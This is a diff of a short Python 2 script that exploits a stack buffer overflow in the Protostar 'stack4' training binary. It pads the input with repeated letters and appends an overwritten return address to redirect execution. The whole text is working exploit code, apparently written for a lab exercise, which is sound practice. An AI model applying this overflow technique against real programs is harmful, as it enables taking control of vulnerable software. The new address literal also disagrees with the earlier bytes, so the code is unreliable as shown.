@@ -1,18 +1,18 @@
 #!/usr/bin/env python2.6
 
-from subprocess import Popen, PIPE
-
-p = Popen("/home/adam/stack4",stdin=PIPE)
+from utils import run_file_with_stdin
+import struct
 
 buff = "".join([l * 3 for l in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"])
-
 buff = buff[:len(buff) - 2]
 
-
 flag = reversed('\x08\x04\x83\xf4')
+flag = struct.pack("I", 0x0804832f4)
+
 
 payload = buff + "".join(flag)
 
-print payload
-
-p.communicate(payload)
+stdin, stderr = run_file_with_stdin("/opt/protostar/bin/stack4", payload)
+print stdin
+print "\n----------------------\n"
+print stderr
